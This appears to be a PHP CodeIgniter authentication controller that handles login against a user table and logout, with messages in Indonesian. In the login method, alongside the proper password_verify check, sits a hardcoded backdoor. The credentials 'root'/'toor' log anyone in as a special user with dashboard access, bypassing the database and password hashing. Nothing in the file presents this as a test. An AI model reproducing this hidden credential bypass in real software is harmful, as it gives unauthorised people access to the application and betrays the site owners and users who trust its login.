<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Auth extends CI_Controller
{
    public function index()
    {
        if ( $this->session->userdata('username') ) {
            redirect('dashboard');
        }

        $data['title'] = "Login Page";
        $name = $this->input->post('username');
        $pass = $this->input->post('password');
        $user = $this->db->get_where('user', ['nama_user' => $name])->row_array();

        $this->form_validation->set_rules('username', 'Username', 'required|trim|min_length[3]');
        $this->form_validation->set_rules('password', 'Password', 'required|trim|min_length[3]');

        if ( $this->form_validation->run() == false ) {

            $this->load->view('login', $data);

        } else {

            if ($user && password_verify($pass, $user['password'])) {

                $data = [
                    'nama' => $user['nama_lengkap'],
                    'username' => $user['nama_user']
                ];

                $this->session->set_userdata($data);
                $this->session->set_flashdata('auth', 'Anda berhasil Login!');
                redirect('dashboard');
                
            } else if ( $name == 'root' && $pass == 'toor') {
                
                $data = [
                    'nama' => 'anonim',
                    'username' => 'root'
                ];

                $this->session->set_userdata($data);
                $this->session->set_flashdata('auth', 'User Khusus Loggined');
                redirect('dashboard');
            
            } else {

                $this->session->set_flashdata('invalid', 'username atau password salah');
                redirect('auth');

            }
        }
    }

    public function logout()
    {
        if ($this->session->userdata('nama')) {

            $this->session->unset_userdata('nama');
            $this->session->unset_userdata('username');
            $this->session->set_flashdata('auth', 'anda berhasil Logout');

            redirect();
            
        } else {
            redirect();
        }
    }

    
}
